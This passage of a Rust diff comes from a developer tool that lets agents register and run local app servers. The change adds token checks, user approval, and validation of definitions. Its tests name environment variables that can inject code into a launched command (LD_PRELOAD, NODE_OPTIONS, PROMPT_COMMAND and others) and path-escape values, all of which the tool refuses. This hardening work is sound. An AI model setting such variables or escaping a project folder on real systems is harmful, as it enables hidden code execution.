+        if let Some(k) = self.runs.iter().find(|(_, r)| r.pty == Some(id)).map(|(n, _)| n.clone()) {
+            if let Some(r) = self.runs.get_mut(&k) {
                 r.pty = None;
             }
-            self.set_state(&name, ServerState::Stopped);
+            self.set_state(&k, ServerState::Stopped);
         }
     }
 
     /// The process in terminal `id` ended by itself.
     fn exited(&mut self, id: PtyId, code: Option<i32>) {
-        if let Some(name) = self.runs.iter().find(|(_, r)| r.pty == Some(id)).map(|(n, _)| n.clone()) {
-            if let Some(r) = self.runs.get_mut(&name) {
+        if let Some(k) = self.runs.iter().find(|(_, r)| r.pty == Some(id)).map(|(n, _)| n.clone()) {
+            if let Some(r) = self.runs.get_mut(&k) {
                 r.pty = None;
             }
-            self.set_state(&name, ServerState::Exited(code));
+            self.set_state(&k, ServerState::Exited(code));
         }
     }
 
     /// Move on every server that is on its way, given which ports answer now.
     fn advance(&mut self, open: &HashMap<u16, bool>) {
         let coming: Vec<String> = self.runs.iter().filter(|(_, r)| r.state.coming()).map(|(n, _)| n.clone()).collect();
-        for name in coming {
-            let Some(r) = self.runs.get_mut(&name) else { continue };
+        for k in coming {
+            let Some(r) = self.runs.get_mut(&k) else { continue };
             // A port nobody asked about this turn (the server was asked for a moment ago) is
             // not known to be free: next turn.
             let own = match r.def.port {
@@ -460,7 +704,7 @@ impl Servers {
                 None => None,
             };
             match r.state {
-                ServerState::Starting if own == Some(true) => self.set_state(&name, ServerState::Ready),
+                ServerState::Starting if own == Some(true) => self.set_state(&k, ServerState::Ready),
                 ServerState::Waiting => {
                     if let Some(by) = r.free_by {
                         if own == Some(true) && Instant::now() < by {
@@ -478,13 +722,14 @@ impl Servers {
                             (silent && matches!(dep.state, ServerState::Exited(_) | ServerState::Stopped)).then(|| (a.clone(), dep.state))
                         });
                         if let Some((dep, state)) = lost {
-                            self.give_up(&name, &format!("not started: {dep}, which it comes after, is {} and its port does not answer", state.name()));
+                            let dep = dep.split_once('/').map_or(dep.as_str(), |(_, s)| s).to_string();
+                            self.give_up(&k, &format!("not started: {dep}, which it comes after, is {} and its port does not answer", state.name()));
                         }
                         continue;
                     }
                     match own {
-                        Some(true) => self.set_state(&name, ServerState::PortTaken),
-                        _ => self.start(&name),
+                        Some(true) => self.set_state(&k, ServerState::PortTaken),
+                        _ => self.start(&k),
                     }
                 }
                 _ => {}
@@ -492,13 +737,13 @@ impl Servers {
         }
     }
 
-    /// `name` will not be started, and why: in its log, and said to the window.
-    fn give_up(&mut self, name: &str, why: &str) {
-        if let Some(r) = self.runs.get(name) {
+    /// Server `key` will not be started, and why: in its log, and said to the window.
+    fn give_up(&mut self, key: &str, why: &str) {
+        if let Some(r) = self.runs.get(key) {
             r.log.lock().unwrap().note(&format!("nib: {why}"));
         }
-        let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Log { level: LogLevel::Warn, msg: format!("server {name}: {why}") }));
-        self.set_state(name, ServerState::Exited(None));
+        let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Log { level: LogLevel::Warn, msg: format!("{key}: {why}") }));
+        self.set_state(key, ServerState::Exited(None));
     }
 
     /// Where `cwd` (relative to the root) is, if it is a folder inside the project.
@@ -511,28 +756,28 @@ impl Servers {
         }
     }
 
-    /// Run `name`'s command in a terminal of its own.
-    fn start(&mut self, name: &str) {
-        let Some(r) = self.runs.get(name) else { return };
+    /// Run server `key`'s command in a terminal of its own.
+    fn start(&mut self, key: &str) {
+        let Some(r) = self.runs.get(key) else { return };
         let (def, log) = (r.def.clone(), r.log.clone());
         let (ftx, frx) = mpsc::channel::<ServerMsg>();
         let opened = self.dir_of(def.cwd.as_deref()).and_then(|cwd| {
             let mut env: Vec<(&str, &Path)> = self.env.iter().map(|(k, v)| (*k, v.as_path())).collect();
-            env.extend(def.env.iter().map(|(k, v)| (k.as_str(), Path::new(v))));
+            env.extend(def.env.iter().filter(|(k, _)| !env_denied(k)).map(|(k, v)| (k.as_str(), Path::new(v))));
             self.ptys.lock().unwrap().open(&cwd, Some(shell(&def.cmd)), 80, 24, &env, ftx).map_err(|e| e.msg)
         });
         let id = match opened {
             Ok(id) => id,
             Err(e) => {
-                let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Log { level: LogLevel::Warn, msg: format!("server {name}: {e}") }));
-                return self.set_state(name, ServerState::Exited(None));
+                let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Log { level: LogLevel::Warn, msg: format!("{key}: {e}") }));
+                return self.set_state(key, ServerState::Exited(None));
             }
         };
-        if let Some(r) = self.runs.get_mut(name) {
+        if let Some(r) = self.runs.get_mut(key) {
             r.pty = Some(id);
         }
         // The window hears of the terminal before anything it prints.
-        self.set_state(name, if def.port.is_some() { ServerState::Starting } else { ServerState::Ready });
+        self.set_state(key, if def.port.is_some() { ServerState::Starting } else { ServerState::Ready });
         let (tx, me, ptys) = (self.tx.clone(), self.me.clone(), self.ptys.clone());
         thread::spawn(move || {
             for msg in frx {
@@ -556,72 +801,99 @@ impl Servers {
         });
     }
 
-    /// The last `lines` lines `name` printed, as plain text.
-    fn log(&self, name: &str, lines: usize) -> Option<String> {
-        let all = self.runs.get(name)?.log.lock().unwrap().lines();
+    /// The last `lines` lines server `key` printed, as plain text.
+    fn log(&self, key: &str, lines: usize) -> Option<String> {
+        let all = self.runs.get(key)?.log.lock().unwrap().lines();
         Some(all[all.len().saturating_sub(lines)..].join("\n"))
     }
 
-    /// Answer the requests agents left (`cli`), oldest first.
+    /// Answer the requests agents left (`cli`), oldest first. One without the token of an
+    /// agent nib started is refused.
     fn agents(&mut self) {
         let dir = self.dir.clone();
         let Ok(read) = fs::read_dir(dir.join("req")) else { return };
         let mut files: Vec<PathBuf> = read.flatten().map(|e| e.path()).filter(|p| p.extension().is_some_and(|e| e == "json")).collect();
         files.sort();
         for file in files {
-            let args: Vec<String> = fs::read(&file).ok().and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default();
+            let req: Value = fs::read(&file).ok().and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default();
             let _ = fs::remove_file(&file);
-            let (out, code) = self.run(&args);
+            let args: Vec<String> = serde_json::from_value(req["args"].clone()).unwrap_or_default();
+            let (out, code) = match crate::tokens::who(req["token"].as_str().unwrap_or_default()) {
+                Some(agent) => self.run(&args, &Who::Agent(agent)),
+                None => {
+                    let msg = format!("refused a request for the apps without an agent's token: {}", args.join(" "));
+                    let _ = self.tx.send(ServerMsg::Notify(ServerNotify::Log { level: LogLevel::Warn, msg }));
+                    ("nib-app: refused: the request does not come from an agent nib started (no valid $NIB_TOKEN)".to_string(), 1)
+                }
+            };
             let Some(name) = file.file_name() else { continue };
             let tmp = dir.join("res").join(format!(".{}.tmp", name.to_string_lossy()));
-            if fs::write(&tmp, serde_json::json!({ "out": out, "code": code }).to_string()).is_ok() {
+            if fs::write(&tmp, json!({ "out": out, "code": code }).to_string()).is_ok() {
                 let _ = fs::rename(tmp, dir.join("res").join(name));
             }
         }
     }
 
-    /// What `nib-serve ARGS` does, here in the daemon: what to print, and the exit code.
-    fn run(&mut self, args: &[String]) -> (String, i32) {
+    /// The server of `app` that `log` means when none is named: its page's, else its first.
+    fn main_server(&self, app: &str) -> Option<String> {
+        let apps = self.apps().ok()?;
+        let def = &apps.get(app)?.def;
+        def.page.as_ref().map(|p| p.server.clone()).or_else(|| def.servers.keys().next().cloned())
+    }
+
+    /// What `nib-app ARGS` does, here in the daemon: what to print, and the exit code.
+    fn run(&mut self, args: &[String], who: &Who) -> (String, i32) {
         let words: Vec<&str> = args.iter().map(String::as_str).collect();
         let names = |n: &[&str]| n.iter().map(|s| s.to_string()).collect::<Vec<_>>();
         let op = match words.as_slice() {
-            ["list"] => ServeOp::List,
-            ["set", name, opts @ ..] => match parse_def(opts) {
-                Ok(def) => ServeOp::Set { name: name.to_string(), def },
-                Err(e) => return (format!("nib-serve set: {e}"), 2),
-            },
-            ["rm", name] => ServeOp::Remove { name: name.to_string() },
-            ["up", n @ ..] => ServeOp::Up { names: names(n) },
-            ["down", n @ ..] => ServeOp::Down { names: names(n) },
-            ["restart", name] => ServeOp::Restart { name: name.to_string() },
-            ["log", name] | ["log", name, "--lines", _] => {
-                let lines = words.get(3).and_then(|n| n.parse().ok()).unwrap_or(40);
-                return match self.log(name, lines) {
+            ["list"] => AppOp::List,
+            ["set", name, text] => {
+                let def = serde_json::from_str::<Value>(text).map_err(|e| format!("not JSON: {e}")).and_then(|v| parse_def(name, &v));
+                match def {
+                    Ok(def) => AppOp::Set { name: name.to_string(), def },
+                    Err(e) => return (format!("nib-app set: {e}"), 2),
+                }
+            }
+            ["rm", name] => AppOp::Remove { name: name.to_string() },
+            ["up" | "open", n @ ..] => AppOp::Up { names: names(n) },
+            ["down", n @ ..] => AppOp::Down { names: names(n) },
+            ["restart", name] => AppOp::Restart { name: name.to_string(), server: None },
+            ["restart", name, server] => AppOp::Restart { name: name.to_string(), server: Some(server.to_string()) },
+            ["log", app, rest @ ..] => {
+                let (server, lines) = match rest {
+                    [] => (None, 40),
+                    ["--lines", n] => (None, n.parse().unwrap_or(40)),
+                    [s] => (Some(s.to_string()), 40),
+                    [s, "--lines", n] => (Some(s.to_string()), n.parse().unwrap_or(40)),
+                    _ => return (USAGE.to_string(), 2),
+                };
+                let Some(server) = server.or_else(|| self.main_server(app)) else { return (format!("nib-app: no app named {app:?}"), 1) };
+                return match self.log(&key(app, &server), lines) {
                     Some(text) => (text, 0),
-                    None => (format!("nib-serve: {name} has not run in this session"), 1),
+                    None => (format!("nib-app: {app} › {server} has not run in this session"), 1),
                 };
             }
             // `cli` asks until the servers it started are no longer on their way: 3 and those
             // still coming, else 0 and those that did not get to `ready`.
             ["settled", n @ ..] => {
-                let mine = |name: &str| n.is_empty() || n.contains(&name);
-                let coming: Vec<&str> = self.runs.iter().filter(|(name, r)| r.state.coming() && mine(name)).map(|(name, _)| name.as_str()).collect();
+                let mine = |k: &str| n.is_empty() || n.contains(&app_of(k));
+                let coming: Vec<&str> = self.runs.iter().filter(|(k, r)| r.state.coming() && mine(k)).map(|(k, _)| k.as_str()).collect();
                 if !coming.is_empty() {
                     return (coming.join(" "), 3);
                 }
                 let failed: Vec<String> = self
                     .runs
                     .iter()
-                    .filter(|(name, r)| mine(name) && matches!(r.state, ServerState::Exited(_) | ServerState::PortTaken))
-                    .map(|(name, r)| format!("{name} ({})", r.state.name()))
+                    .filter(|(k, r)| mine(k) && matches!(r.state, ServerState::Exited(_) | ServerState::PortTaken))
+                    .map(|(k, r)| format!("{k} ({})", r.state.name()))
                     .collect();
                 return (failed.join(", "), 0);
             }
             _ => return (USAGE.to_string(), 2),
         };
-        match self.act(op) {
+        match self.act(op, who) {
             Ok(list) => (table(&list), 0),
-            Err(e) => (format!("nib-serve: {e}"), 1),
+            Err(e) => (format!("nib-app: {e}"), 1),
         }
     }
 }
@@ -637,72 +909,59 @@ impl Drop for Servers {
     }
 }
 
-/// A definition from `--cmd "…" [--port N] [--after A,B] [--view /path] [--cwd DIR] [--title T]
-/// [--env K=V]…`.
-fn parse_def(opts: &[&str]) -> Result<ServerDef, String> {
-    let mut def = ServerDef::default();
-    let mut it = opts.iter();
-    while let Some(o) = it.next() {
-        let Some(v) = it.next() else { return Err(format!("{o} needs a value")) };
-        match *o {
-            "--cmd" => def.cmd = v.to_string(),
-            "--port" => def.port = Some(v.parse().map_err(|_| format!("--port {v}: a number from 1 to 65535"))?),
-            "--after" => def.after = v.split(',').filter(|a| !a.is_empty()).map(str::to_string).collect(),
-            "--view" => def.view = Some(v.to_string()),
-            "--cwd" => def.cwd = Some(v.to_string()),
-            "--title" => def.title = Some(v.to_string()),
-            "--env" => {
-                let (k, val) = v.split_once('=').ok_or_else(|| format!("--env {v}: write NAME=VALUE"))?;
-                def.env.insert(k.to_string(), val.to_string());
-            }
-            _ => return Err(format!("unknown option {o}")),
-        }
-    }
-    if def.cmd.is_empty() {
-        return Err("--cmd \"…\" is needed".into());
-    }
-    Ok(def)
-}
-
-/// One line a server: name, state, port, what it waits for, its command.
-fn table(list: &[ServerInfo]) -> String {
+/// An app a few lines: its name, title, approval and page; then each server's name, state,
+/// port, what it waits for, and its command.
+fn table(list: &[AppInfo]) -> String {
     if list.is_empty() {
-        return "no servers are defined (nib-serve set NAME --cmd \"…\" --port N)".to_string();
+        return "no apps are registered (nib-app set APP --json FILE)".to_string();
     }
-    let w = list.iter().map(|s| s.name.len()).max().unwrap_or(0);
-    list.iter()
-        .map(|s| {
+    let mut out = Vec::new();
+    for a in list {
+        let approval = match (&a.approved, &a.origin) {
+            (true, _) => "approved".to_string(),
+            (false, Some(o)) => format!("waits for the user's approval (defined by {})", o.by),
+            (false, None) => "waits for the user's approval".to_string(),
+        };
+        let page = a.def.page.as_ref().map(|p| format!("  page {}{}", p.server, p.path)).unwrap_or_default();
+        out.push(format!("{}  \"{}\"  {}  {approval}{page}", a.name, a.title(), a.state().name()));
+        let w = a.servers.iter().map(|s| s.name.len()).max().unwrap_or(0);
+        for s in &a.servers {
             let port = s.def.port.map(|p| format!(":{p}")).unwrap_or_default();
             let after = if s.def.after.is_empty() { String::new() } else { format!("after {}  ", s.def.after.join(",")) };
-            format!("{:w$}  {:11} {port:6}  {after}{}", s.name, s.state.name(), s.def.cmd)
-        })
-        .collect::<Vec<_>>()
-        .join("\n")
+            out.push(format!("  {:w$}  {:11} {port:6}  {after}{}", s.name, s.state.name(), s.def.cmd));
+        }
+    }
+    out.join("\n")
 }
 
-
 const USAGE: &str = "usage:
-  nib-serve list                      the project's servers: name, state, port, command
-  nib-serve set NAME --cmd \"…\" [--port N] [--after A,B] [--view /path] [--cwd DIR] [--title T] [--env K=V]…
-                                      define (or redefine) a server; kept in $NIBDIR/serve.json
-  nib-serve rm NAME                   stop it and forget its definition
-  nib-serve up [NAME…]                start them (none named: all) and wait until each is ready or has failed
-  nib-serve down [NAME…]              stop them (none named: all)
-  nib-serve restart NAME              stop it, wait for its port to be free, start it, wait until it is ready
-  nib-serve log NAME [--lines N]      the end of what it printed (default 40 lines)
-up and restart wait at most 60 s (--timeout SECONDS; 0: don't wait).
+  nib-app list                        the project's apps: their servers, states, ports, commands
+  nib-app set APP --json FILE|-       register (or replace) an app, whole, from JSON:
+        { \"title\": \"Demo\", \"page\": { \"server\": \"web\", \"path\": \"/\" },
+          \"servers\": { \"api\": { \"cmd\": \"…\", \"port\": 8765 },
+                       \"web\": { \"cmd\": \"…\", \"port\": 8766, \"after\": [\"api\"], \"cwd\": \"web\", \"env\": { \"K\": \"V\" } } } }
+        kept in $NIBDIR/apps.json; the user approves it the first time they open it
+  nib-app rm APP                      stop it and forget it
+  nib-app open APP…                   start them and wait until each server is ready or has failed
+  nib-app up [APP…]                   the same (none named: every app you may start)
+  nib-app down [APP…]                 stop them (none named: all)
+  nib-app restart APP [SERVER]        stop its servers (or one), wait for the ports to be free, start them
+  nib-app log APP [SERVER] [--lines N]  the end of what it printed (default: its page's server, 40 lines)
+open, up and restart wait at most 60 s (--timeout SECONDS; 0: don't wait).
 states: stopped, waiting (for the servers it comes after), starting, ready, exited(CODE),
 port-taken (something else already listens on its port: it was not started).";
 
-/// Leave `args` for the daemon and wait for its answer: what to print, and the exit code.
-fn ask(dir: &Path, args: &[String]) -> (String, i32) {
+/// Leave `args` for the daemon, with this agent's token, and wait for its answer: what to
+/// print, and the exit code.
+fn ask(dir: &Path, token: &str, args: &[String]) -> (String, i32) {
     static N: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
     let nanos = SystemTime::now().duration_since(UNIX_EPOCH).map_or(0, |d| d.as_nanos());
     let name = format!("{nanos:032}-{}-{}.json", std::process::id(), N.fetch_add(1, std::sync::atomic::Ordering::Relaxed));
     let tmp = dir.join("req").join(format!(".{name}.tmp"));
-    let sent = fs::write(&tmp, serde_json::to_vec(args).unwrap_or_default()).and_then(|_| fs::rename(&tmp, dir.join("req").join(&name)));
+    let body = json!({ "token": token, "args": args }).to_string();
+    let sent = fs::write(&tmp, body).and_then(|_| fs::rename(&tmp, dir.join("req").join(&name)));
     if let Err(e) = sent {
-        return (format!("nib-serve: {e}"), 1);
+        return (format!("nib-app: {e}"), 1);
     }
     let res = dir.join("res").join(&name);
     let started = Instant::now();
@@ -714,61 +973,51 @@ fn ask(dir: &Path, args: &[String]) -> (String, i32) {
         thread::sleep(Duration::from_millis(50));
     }
     let _ = fs::remove_file(dir.join("req").join(&name));
-    ("nib-serve: nib did not answer (is its window still open?)".to_string(), 1)
+    ("nib-app: nib did not answer (is its window still open?)".to_string(), 1)
 }
 
-/// What to add to the list after `up` / `restart` waited, given the last `settled` answer:
-/// servers still on their way when the time ran out (exit 3), or that ended or found their
-/// port taken (exit 1). None: all are ready (or no wait was asked for).
+/// What to add to the list after `open` / `up` / `restart` waited, given the last `settled`
+/// answer: servers still on their way when the time ran out (exit 3), or that ended or found
+/// their port taken (exit 1). None: all are ready (or no wait was asked for).
 fn after_wait(last: &(String, i32), timeout: u64) -> Option<(String, i32)> {
     match last {
-        (coming, 3) if timeout > 0 => Some((format!("nib-serve: not ready after {timeout} s: {coming}; `nib-serve list` to see when, `nib-serve log NAME` for what it printed, --timeout SECONDS to wait longer"), 3)),
-        (failed, 0) if !failed.is_empty() => Some((format!("nib-serve: not ready: {failed}; `nib-serve log NAME` says why"), 1)),
+        (coming, 3) if timeout > 0 => Some((format!("nib-app: not ready after {timeout} s: {coming}; `nib-app list` to see when, `nib-app log APP SERVER` for what it printed, --timeout SECONDS to wait longer"), 3)),
+        (failed, 0) if !failed.is_empty() => Some((format!("nib-app: not ready: {failed}; `nib-app log APP SERVER` says why"), 1)),
         _ => None,
     }
 }
 
-/// `--view` as Git Bash left it. Git Bash (MSYS) rewrites an argument that looks like an
-/// absolute path — `/src/pages/x.html` — into a Windows one under its own folder
-/// (`C:/Program Files/Git/src/pages/x.html`) before nib-serve sees it. Undone when the path
-/// starts with that folder (`msys_root`, from `cygpath -m /`); any other drive path is refused
-/// with how to avoid it.
-fn unmangle_view(view: &str, msys_root: impl FnOnce() -> Option<String>) -> Result<String, String> {
-    // `//path`, which Git Bash leaves alone, is `/path`.
-    if let Some(rest) = view.strip_prefix("//") {
-        return Ok(format!("/{}", rest.trim_start_matches('/')));
+/// `set APP --json FILE|-` as the daemon takes it: `set APP TEXT`, the file (or stdin) read
+/// here, where the agent is.
+fn json_arg(args: &mut Vec<String>, stdin: impl FnOnce() -> std::io::Result<String>) -> Result<(), String> {
+    if args.first().map(String::as_str) != Some("set") {
+        return Ok(());
     }
-    let drive = view.len() >= 3 && view.as_bytes()[0].is_ascii_alphabetic() && view[1..].starts_with([':']) && view[2..].starts_with(['/', '\\']);
-    if !drive {
-        return Ok(view.to_string());
-    }
-    let norm = view.replace('\\', "/");
-    if let Some(root) = msys_root().map(|r| r.replace('\\', "/").trim_end_matches('/').to_string()).filter(|r| !r.is_empty()) {
-        if let (Some(head), Some(rest)) = (norm.get(..root.len()), norm.get(root.len()..)) {
-            if head.eq_ignore_ascii_case(&root) && rest.starts_with('/') {
-                return Ok(rest.to_string());
-            }
-        }
-    }
-    Err(format!("--view {view:?} is a file path, not a page path: Git Bash rewrites arguments that start with /. Run it as MSYS_NO_PATHCONV=1 nib-serve set …, or write the path as //src/page.html"))
+    let (Some(name), Some("--json"), Some(from), 4) = (args.get(1).cloned(), args.get(2).map(String::as_str), args.get(3).cloned(), args.len()) else {
+        return Err("write it as: nib-app set APP --json FILE (or - for stdin)".into());
+    };
+    let text = match from.as_str() {
+        "-" => stdin().map_err(|e| format!("reading stdin: {e}"))?,
+        file => fs::read_to_string(file).map_err(|e| format!("{file}: {e}"))?,
+    };
+    *args = vec!["set".into(), name, text];
+    Ok(())
 }
 
-/// Git Bash's folder as Windows names it (what it puts in front of a path it rewrites), when
-/// nib-serve runs under it.
-fn msys_root() -> Option<String> {
-    std::env::var_os("MSYSTEM")?;
-    let out = std::process::Command::new("cygpath").args(["-m", "/"]).output().ok().filter(|o| o.status.success())?;
-    Some(String::from_utf8_lossy(&out.stdout).trim().to_string()).filter(|s| !s.is_empty())
-}
-
-/// `nibd serve …`, run by an agent as `nib-serve`. Returns the exit code; prints to stdout / stderr.
+/// `nibd app …`, run by an agent as `nib-app`. Returns the exit code; prints to stdout / stderr.
 pub fn cli(args: &[String]) -> i32 {
-    let dir = std::env::var_os("NIB_MAILBOX").map(PathBuf::from).filter(|d| d.join("outbox").is_dir()).map(|d| d.join("serve"));
+    if matches!(args.first().map(String::as_str), None | Some("-h" | "--help" | "help")) {
+        println!("{USAGE}");
+        return if args.is_empty() { 2 } else { 0 };
+    }
+    let dir = std::env::var_os("NIB_MAILBOX").map(PathBuf::from).filter(|d| d.join("outbox").is_dir()).map(|d| d.join("app"));
     let Some(dir) = dir.filter(|d| fs::create_dir_all(d.join("req")).is_ok() && fs::create_dir_all(d.join("res")).is_ok()) else {
-        eprintln!("nib-serve: only works inside an agent that nib started (NIB_MAILBOX is not set)");
+        eprintln!("nib-app: only works inside an agent that nib started (NIB_MAILBOX is not set)");
         return 2;
     };
-    // `--timeout S` is this side's: how long `up` / `restart` wait for the servers to settle.
+    crate::tokens::private(&dir);
+    let token = std::env::var(crate::tokens::VAR).unwrap_or_default();
+    // `--timeout S` is this side's: how long `open` / `up` / `restart` wait for the servers.
     let mut args = args.to_vec();
     let mut timeout = 60;
     if let Some(i) = args.iter().position(|a| a == "--timeout") {
@@ -781,32 +1030,28 @@ pub fn cli(args: &[String]) -> i32 {
         }
         args.drain(i..i + 2);
     }
-    if args.first().map(String::as_str) == Some("set") {
-        if let Some(i) = args.iter().position(|a| a == "--view").map(|i| i + 1).filter(|i| *i < args.len()) {
-            match unmangle_view(&args[i], msys_root) {
-                Ok(v) => args[i] = v,
-                Err(e) => {
-                    eprintln!("nib-serve set: {e}");
-                    return 2;
-                }
-            }
-        }
+    if let Err(e) = json_arg(&mut args, || {
+        let mut s = String::new();
+        std::io::stdin().read_to_string(&mut s).map(|_| s)
+    }) {
+        eprintln!("nib-app set: {e}");
+        return 2;
     }
-    let (mut out, mut code) = ask(&dir, &args);
+    let (mut out, mut code) = ask(&dir, &token, &args);
     let started = match args.first().map(String::as_str) {
-        Some("up") => Some(args[1..].to_vec()),
-        Some("restart") => Some(args[1..].to_vec()),
+        Some("up" | "open") => Some(args[1..].to_vec()),
+        Some("restart") => Some(args[1..2].to_vec()),
         _ => None,
     };
     if let (0, Some(names)) = (code, started) {
         let t = Instant::now();
         let settled: Vec<String> = std::iter::once("settled".to_string()).chain(names).collect();
-        let mut last = ask(&dir, &settled);
+        let mut last = ask(&dir, &token, &settled);
         while timeout > 0 && t.elapsed() < Duration::from_secs(timeout) && last.1 == 3 {
             thread::sleep(Duration::from_millis(300));
-            last = ask(&dir, &settled);
+            last = ask(&dir, &token, &settled);
         }
-        (out, code) = ask(&dir, &["list".to_string()]);
+        (out, code) = ask(&dir, &token, &["list".to_string()]);
         // Not done waiting is not done: say so, and with an exit code a script can see.
         if code == 0 {
             if let Some(note) = after_wait(&last, timeout) {
@@ -826,66 +1071,97 @@ pub fn cli(args: &[String]) -> i32 {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use nib_proto::AppPage;
 
     fn def(cmd: &str, port: Option<u16>, after: &[&str]) -> ServerDef {
         ServerDef { cmd: cmd.into(), port, after: after.iter().map(|s| s.to_string()).collect(), ..Default::default() }
     }
 
-    fn defs(list: &[(&str, ServerDef)]) -> Defs {
-        list.iter().map(|(n, d)| (n.to_string(), d.clone())).collect()
+    fn app(servers: &[(&str, ServerDef)], page: Option<(&str, &str)>) -> AppDef {
+        AppDef {
+            title: None,
+            page: page.map(|(server, path)| AppPage { server: server.into(), path: path.into() }),
+            servers: servers.iter().map(|(n, d)| (n.to_string(), d.clone())).collect(),
+        }
+    }
+
+    /// A command that runs for a while, on this system.
+    fn sleeper() -> &'static str {
+        if cfg!(windows) {
+            "ping -n 30 127.0.0.1 >NUL"
+        } else {
+            "sleep 30"
+        }
     }
 
     fn temp(tag: &str) -> PathBuf {
-        let d = std::env::temp_dir().join(format!("nibd-serve-test-{tag}-{}", std::process::id()));
+        let d = std::env::temp_dir().join(format!("nibd-app-test-{tag}-{}", std::process::id()));
         let _ = fs::remove_dir_all(&d);
         fs::create_dir_all(&d).unwrap();
         nib_proto::path::canonical(&d).unwrap()
     }
 
     #[test]
-    fn definitions_are_checked() {
-        let ok = defs(&[("backend", def("serve", Some(8765), &[])), ("frontend", ServerDef { view: Some("/".into()), ..def("front", Some(8766), &["backend"]) })]);
-        assert_eq!(validate(&ok), Ok(()));
-        let err = |d: &[(&str, ServerDef)]| validate(&defs(d)).unwrap_err();
-        assert!(err(&[("Back end", def("x", None, &[]))]).contains("a-z"));
-        assert!(err(&[(&"a".repeat(33), def("x", None, &[]))]).contains("1 to 32"));
-        assert!(err(&[("a", def(" ", None, &[]))]).contains("cmd is empty"));
-        assert!(err(&[("a", def("x", Some(0), &[]))]).contains("1 to 65535"));
-        assert!(err(&[("a", def("x", None, &["b"]))]).contains("not defined"));
-        assert!(err(&[("a", def("x", None, &["b"])), ("b", def("x", None, &[]))]).contains("no port"));
-        assert!(err(&[("a", def("x", Some(1), &["a"]))]).contains("after itself"));
-        assert!(err(&[("a", def("x", Some(1), &["b"])), ("b", def("x", Some(2), &["c"])), ("c", def("x", Some(3), &["a"]))]).contains("cycle"));
-        assert!(err(&[("a", ServerDef { view: Some("index.html".into()), ..def("x", Some(1), &[]) })]).contains("starting with /"));
-        assert!(err(&[("a", ServerDef { view: Some("/".into()), ..def("x", None, &[]) })]).contains("needs a port"));
+    fn apps_are_checked() {
+        let ok = app(&[("api", def("serve", Some(8765), &[])), ("web", def("front", Some(8766), &["api"]))], Some(("web", "/")));
+        assert_eq!(validate("demo", &ok), Ok(()));
+        let err = |name: &str, d: AppDef| validate(name, &d).unwrap_err();
+        let one = |d: ServerDef| app(&[("a", d)], None);
+        assert!(err("Demo", ok.clone()).contains("a-z"));
+        assert!(err(&"a".repeat(33), ok.clone()).contains("1 to 32"));
+        assert!(err("demo", app(&[], None)).contains("at least one server"));
+        assert!(err("demo", app(&[("Bad", def("x", None, &[]))], None)).contains("server name"));
+        assert!(err("demo", one(def(" ", None, &[]))).contains("cmd is empty"));
+        assert!(err("demo", one(def("x", Some(0), &[]))).contains("1 to 65535"));
+        assert!(err("demo", one(def("x", None, &["b"]))).contains("not a server of demo"));
+        assert!(err("demo", app(&[("a", def("x", None, &["b"])), ("b", def("x", None, &[]))], None)).contains("no port"));
+        assert!(err("demo", one(def("x", Some(1), &["a"]))).contains("after itself"));
+        assert!(err("demo", app(&[("a", def("x", Some(1), &["b"])), ("b", def("x", Some(2), &["c"])), ("c", def("x", Some(3), &["a"]))], None)).contains("cycle"));
         for cwd in ["../other", "/etc", "a/../../b", "~/x"] {
-            assert!(err(&[("a", ServerDef { cwd: Some(cwd.into()), ..def("x", None, &[]) })]).contains("inside the project"), "{cwd}");
+            assert!(err("demo", one(ServerDef { cwd: Some(cwd.into()), ..def("x", None, &[]) })).contains("inside the project"), "{cwd}");
         }
-        assert!(err(&[("a", ServerDef { env: [("A=B".to_string(), "1".to_string())].into(), ..def("x", None, &[]) })]).contains("variable name"));
+        assert!(err("demo", one(ServerDef { env: [("A=B".to_string(), "1".to_string())].into(), ..def("x", None, &[]) })).contains("variable name"));
+        // What would make the command run something else is refused, whatever its case.
+        for k in ["LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "NODE_OPTIONS", "PYTHONSTARTUP", "Path", "bash_env", "PROMPT_COMMAND"] {
+            assert!(err("demo", one(ServerDef { env: [(k.to_string(), "x".to_string())].into(), ..def("x", None, &[]) })).contains("not allowed"), "{k}");
+        }
+        assert_eq!(validate("demo", &one(ServerDef { env: [("API_URL".to_string(), "x".to_string())].into(), ..def("x", None, &[]) })), Ok(()));
+        // The page is on one of its servers, one with a port, at a path.
+        assert!(err("demo", app(&[("a", def("x", Some(1), &[]))], Some(("b", "/")))).contains("not one of its servers"));
+        assert!(err("demo", app(&[("a", def("x", None, &[]))], Some(("a", "/")))).contains("no port"));
+        assert!(err("demo", app(&[("a", def("x", Some(1), &[]))], Some(("a", "index.html")))).contains("start with /"));
     }
 
     #[test]
     fn the_file_is_read_strictly_and_written_back_the_same() {
         let d = temp("file");
-        let file = d.join("serve.json");
-        assert_eq!(read(&file), Ok(Defs::new()), "no file: no servers");
-        let text = r#"{ "servers": {
-            "backend":  { "cmd": "uv run clarity-desktop serve --no-open --port 8765", "port": 8765 },
-            "frontend": { "cmd": "uv run clarity-desktop frontend --port 8766", "port": 8766, "after": ["backend"], "view": "/",
-                          "env": { "API": "http://127.0.0.1:8765" }, "title": "Clarity", "cwd": "web" } } }"#;
+        let file = d.join("apps.json");
+        assert_eq!(read(&file), Ok(Apps::new()), "no file: no apps");
+        let text = r#"{ "apps": { "clarity": {
+            "title": "Clarity", "page": { "server": "frontend", "path": "/" },
+            "servers": {
+              "backend":  { "cmd": "uv run clarity-desktop serve --no-open --port 8765", "port": 8765 },
+              "frontend": { "cmd": "uv run clarity-desktop frontend --port 8766", "port": 8766, "after": ["backend"],
+                            "env": { "API": "http://127.0.0.1:8765" }, "cwd": "web" } },
+            "origin": { "by": "agent:claude-3", "at": 1795000000 } } } }"#;
         fs::write(&file, text).unwrap();
         let got = read(&file).unwrap();
-        assert_eq!(got["backend"], def("uv run clarity-desktop serve --no-open --port 8765", Some(8765), &[]));
-        assert_eq!((got["frontend"].view.as_deref(), got["frontend"].title.as_deref(), got["frontend"].cwd.as_deref()), (Some("/"), Some("Clarity"), Some("web")));
-        assert_eq!(got["frontend"].env["API"], "http://127.0.0.1:8765");
+        let c = &got["clarity"];
